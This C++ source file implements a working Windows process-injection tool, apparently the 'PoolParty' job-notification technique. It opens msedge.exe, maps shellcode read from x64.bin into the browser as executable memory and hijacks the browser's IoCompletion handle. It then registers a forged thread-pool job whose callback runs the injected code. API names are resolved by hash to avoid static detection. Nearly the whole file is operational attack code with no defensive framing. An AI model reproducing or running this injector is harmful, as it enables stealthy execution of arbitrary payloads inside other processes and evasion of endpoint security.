#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <vector>
#include "HashString.h"
#include "CRT.h"
#include "ApiResolve.h"
#include "Injection.h"

#pragma comment(lib, "dbghelp.lib")

#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define POOL_PARTY_JOB_NAME L"PoolPartyJob"
#define ProcessHandleInformation 51

typedef enum _OBJECT_INFORMATION_CLASS {
	ObjectBasicInformation = 0,
	ObjectTypeInformation = 2
} OBJECT_INFORMATION_CLASS;

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation = 0,
	ProcessDebugPort = 7,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
	HANDLE HandleValue;
	ULONG_PTR HandleCount;
	ULONG_PTR PointerCount;
	ULONG GrantedAccess;
	ULONG ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _PUBLIC_OBJECT_TYPE_INFORMATION {

    UNICODE_STRING TypeName;
    ULONG Reserved[22];    // reserved for internal use

} PUBLIC_OBJECT_TYPE_INFORMATION, * PPUBLIC_OBJECT_TYPE_INFORMATION;

typedef struct _TP_TASK
{
	struct _TP_TASK_CALLBACKS* Callbacks;
	UINT32 NumaNode;
	UINT8 IdealProcessor;
	char Padding_242[3];
	struct _LIST_ENTRY ListEntry;
} TP_TASK, * PTP_TASK;

typedef struct _TP_DIRECT
{
	struct _TP_TASK Task;
	UINT64 Lock;
	struct _LIST_ENTRY IoCompletionInformationList;
	void* Callback;
	UINT32 NumaNode;
	UINT8 IdealProcessor;
	char __PADDING__[3];
} TP_DIRECT, * PTP_DIRECT;

typedef struct _TPP_CALLER
{
	void* ReturnAddress;
} TPP_CALLER, * PTPP_CALLER;

typedef union _TPP_POOL_QUEUE_STATE
{
	union
	{
		INT64 Exchange;
		struct
		{
			INT32 RunningThreadGoal : 16;
			UINT32 PendingReleaseCount : 16;
			UINT32 QueueLength;
		};
	};
} TPP_POOL_QUEUE_STATE, * PTPP_POOL_QUEUE_STATE;

typedef struct _TPP_PH
{
	struct _TPP_PH_LINKS* Root;
} TPP_PH, * PTPP_PH;

typedef struct _TPP_TIMER_SUBQUEUE
{
	INT64 Expiration;
	struct _TPP_PH WindowStart;
	struct _TPP_PH WindowEnd;
	void* Timer;
	void* TimerPkt;
	struct _TP_DIRECT Direct;
	UINT32 ExpirationWindow;
	INT32 __PADDING__[1];
} TPP_TIMER_SUBQUEUE, * PTPP_TIMER_SUBQUEUE;

typedef struct _TPP_TIMER_QUEUE
{
	struct _RTL_SRWLOCK Lock;
	struct _TPP_TIMER_SUBQUEUE AbsoluteQueue;
	struct _TPP_TIMER_SUBQUEUE RelativeQueue;
	INT32 AllocatedTimerCount;
	INT32 __PADDING__[1];
} TPP_TIMER_QUEUE, * PTPP_TIMER_QUEUE;

typedef struct _TPP_REFCOUNT
{
	volatile INT32 Refcount;
} TPP_REFCOUNT, * PTPP_REFCOUNT;

typedef struct _FULL_TP_POOL
{
	struct _TPP_REFCOUNT Refcount;
	long Padding_239;
	union _TPP_POOL_QUEUE_STATE QueueState;
	struct _TPP_QUEUE* TaskQueue[3];
	struct _TPP_NUMA_NODE* NumaNode;
	struct _GROUP_AFFINITY* ProximityInfo;
	void* WorkerFactory;
	void* CompletionPort;
	struct _RTL_SRWLOCK Lock;
	struct _LIST_ENTRY PoolObjectList;
	struct _LIST_ENTRY WorkerList;
	struct _TPP_TIMER_QUEUE TimerQueue;
	struct _RTL_SRWLOCK ShutdownLock;
	UINT8 ShutdownInitiated;
	UINT8 Released;
	UINT16 PoolFlags;
	long Padding_240;
	struct _LIST_ENTRY PoolLinks;
	struct _TPP_CALLER AllocCaller;
	struct _TPP_CALLER ReleaseCaller;
	volatile INT32 AvailableWorkerCount;
	volatile INT32 LongRunningWorkerCount;
	UINT32 LastProcCount;
	volatile INT32 NodeStatus;
	volatile INT32 BindingCount;
	UINT32 CallbackChecksDisabled : 1;
	UINT32 TrimTarget : 11;
	UINT32 TrimmedThrdCount : 11;
	UINT32 SelectedCpuSetCount;
	long Padding_241;
	struct _RTL_CONDITION_VARIABLE TrimComplete;
	struct _LIST_ENTRY TrimmedWorkerList;
} FULL_TP_POOL, * PFULL_TP_POOL;

typedef union _TPP_FLAGS_COUNT
{
	union
	{
		UINT64 Count : 60;
		UINT64 Flags : 4;
		INT64 Data;
	};
} TPP_FLAGS_COUNT, * PTPP_FLAGS_COUNT;

typedef struct _TPP_ITE
{
	struct _TPP_ITE_WAITER* First;
} TPP_ITE, * PTPP_ITE;

typedef struct _TPP_BARRIER
{
	volatile union _TPP_FLAGS_COUNT Ptr;
	struct _RTL_SRWLOCK WaitLock;
	struct _TPP_ITE WaitList;
} TPP_BARRIER, * PTPP_BARRIER;

typedef struct _ALPC_WORK_ON_BEHALF_TICKET
{
	UINT32 ThreadId;
	UINT32 ThreadCreationTimeLow;
} ALPC_WORK_ON_BEHALF_TICKET, * PALPC_WORK_ON_BEHALF_TICKET;

typedef struct _TPP_CLEANUP_GROUP_MEMBER
{
	struct _TPP_REFCOUNT Refcount;
	long Padding_233;
	const struct _TPP_CLEANUP_GROUP_MEMBER_VFUNCS* VFuncs;
	struct _TP_CLEANUP_GROUP* CleanupGroup;
	void* CleanupGroupCancelCallback;
	void* FinalizationCallback;
	struct _LIST_ENTRY CleanupGroupMemberLinks;
	struct _TPP_BARRIER CallbackBarrier;
	union
	{
		void* Callback;
		void* WorkCallback;
		void* SimpleCallback;
		void* TimerCallback;
		void* WaitCallback;
		void* IoCallback;
		void* AlpcCallback;
		void* AlpcCallbackEx;
		void* JobCallback;
	};
	void* Context;
	struct _ACTIVATION_CONTEXT* ActivationContext;
	void* SubProcessTag;
	struct _GUID ActivityId;
	struct _ALPC_WORK_ON_BEHALF_TICKET WorkOnBehalfTicket;
	void* RaceDll;
	FULL_TP_POOL* Pool;
	struct _LIST_ENTRY PoolObjectLinks;
	union
	{
		volatile INT32 Flags;
		UINT32 LongFunction : 1;
		UINT32 Persistent : 1;
		UINT32 UnusedPublic : 14;
		UINT32 Released : 1;
		UINT32 CleanupGroupReleased : 1;
		UINT32 InCleanupGroupCleanupList : 1;
		UINT32 UnusedPrivate : 13;
	};
	long Padding_234;
	struct _TPP_CALLER AllocCaller;
	struct _TPP_CALLER ReleaseCaller;
	enum _TP_CALLBACK_PRIORITY CallbackPriority;
	INT32 __PADDING__[1];
} TPP_CLEANUP_GROUP_MEMBER, * PTPP_CLEANUP_GROUP_MEMBER;

typedef struct _FULL_TP_JOB
{
	struct _TP_DIRECT Direct;
	struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
	void* JobHandle;
	union
	{
		volatile int64_t CompletionState;
		int64_t Rundown : 1;
		int64_t CompletionCount : 63;
	};
	struct _RTL_SRWLOCK RundownLock;
} FULL_TP_JOB, * PFULL_TP_JOB;


HANDLE GetProcHandlebyName(LPWSTR procName, DWORD* PID) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
			if (wcscmp((entry.szExeFile), procName) == 0) {
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
				hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
				if (!hProc) { continue; }
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

	return NULL;
}

int main() {
	ApiResolve apiResolve;
	SIZE_T byteWritten;
	constexpr unsigned int hashNtdll = ComplexHashForWChar(L"ntdll.dll");
	LPVOID hNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);
	LPHANDLE pDuplicateHandle = new HANDLE;
	DWORD PID = 0;
	HANDLE hProc = GetProcHandlebyName((LPWSTR)L"msedge.exe", &PID);
	if (!hProc) {
		return -1;
	}

	LPVOID lpShellcode = nullptr;
	DWORD dwShellcodeSize = 0;
	if (!GetFileDataW(L"x64.bin", &lpShellcode, &dwShellcodeSize)) {
		CloseHandle(hProc);
		return -1;
	}

	LPVOID lpRemoteAddr = nullptr;
	if (!MappingShellcode(hProc, lpShellcode, dwShellcodeSize, &lpRemoteAddr, PAGE_EXECUTE_READ)) {
		VirtualFree(lpShellcode, 0, MEM_RELEASE);
		CloseHandle(hProc);
		return -1;
	}

	NTSTATUS ntStatus;
	std::vector<BYTE> information;
	ULONG returnLength = 0;
	typedef NTSTATUS(
		NTAPI*
		_NtQueryInformationProcess)(
			IN HANDLE ProcessHandle,
			IN PROCESSINFOCLASS ProcessInformationClass,
			OUT PVOID ProcessInformation,
			IN ULONG ProcessInformationLength,
			OUT PULONG ReturnLength OPTIONAL
		);
	constexpr unsigned int hashNtQueryInformationProcess = ComplexHashForAnsi("NtQueryInformationProcess");
	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)apiResolve.GetApiAddress(hNtdll, hashNtQueryInformationProcess);
	if (!pNtQueryInformationProcess) {
		return -1;
	}

	do {
		information.resize(returnLength);
		ntStatus =
			pNtQueryInformationProcess(
				hProc,
				static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
				information.data(),
				returnLength,
				&returnLength
			);
		//STATUS_INFO_LENGTH_MISMATCH
	} while (ntStatus == 0xC0000004);

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());

	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
		if (!DuplicateHandle(
			hProc,
			pProcessInformation->Handles[i].HandleValue,
			GetCurrentProcess(),
			pDuplicateHandle,
			IO_COMPLETION_ALL_ACCESS,
			FALSE,
			NULL
		)) {
			continue;
		}

		std::vector<BYTE> object;
		returnLength = 0;
		typedef NTSTATUS
		(NTAPI* _NtQueryObject)(
			_In_opt_ HANDLE Handle,
			_In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
			_Out_writes_bytes_opt_(ObjectInformationLength) PVOID ObjectInformation,
			_In_ ULONG ObjectInformationLength,
			_Out_opt_ PULONG ReturnLength
			);

		constexpr unsigned int hashNtQueryObject = ComplexHashForAnsi("NtQueryObject");
		_NtQueryObject pNtQueryObject = (_NtQueryObject)apiResolve.GetApiAddress(hNtdll, hashNtQueryObject);
		if (!pNtQueryObject) {
			return -1;
		}

		do {
			object.resize(returnLength);
			ntStatus =
				pNtQueryObject(
					*pDuplicateHandle,
					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
					object.data(),
					returnLength,
					&returnLength);
		} while (ntStatus == 0xC0000004);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
		if (std::wstring(pObjectInformation->TypeName.Buffer) == L"IoCompletion") {
			break;
		}
	}

	HANDLE hJob = CreateJobObjectW(nullptr, const_cast<LPWSTR>(POOL_PARTY_JOB_NAME));

	PFULL_TP_JOB pTpJob = { 0 };
	typedef NTSTATUS (NTAPI* _TpAllocJobNotification)(
		_Out_ PFULL_TP_JOB* JobReturn,
		_In_ HANDLE HJob,
		_In_ PVOID Callback,
		_Inout_opt_ PVOID Context,
		_In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron
	);

	constexpr unsigned int hashTpAllocJobNotification = ComplexHashForAnsi("TpAllocJobNotification");
	_TpAllocJobNotification pTpAllocJobNotification = (_TpAllocJobNotification)apiResolve.GetApiAddress(hNtdll, hashTpAllocJobNotification);
	if (!pTpAllocJobNotification) {
		return -1;
	}

	const auto Ntstatus = pTpAllocJobNotification(&pTpJob, hJob, lpRemoteAddr, nullptr, nullptr);

	if (!NT_SUCCESS(Ntstatus))
	{
		return -1;
	}

	LPVOID RemoteTpJobAddress = nullptr;
	DWORD size = sizeof(FULL_TP_JOB) + 1;
	if (!MappingShellcode(hProc, pTpJob, size, &RemoteTpJobAddress, PAGE_READWRITE)) {
		return -1;
	}

	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort{ 0 };
	SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
	JobAssociateCopmletionPort.CompletionPort = *pDuplicateHandle;

	//std::cout << JobAssociateCopmletionPort.CompletionPort;

	SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

	AssignProcessToJobObject(hJob, GetCurrentProcess());
}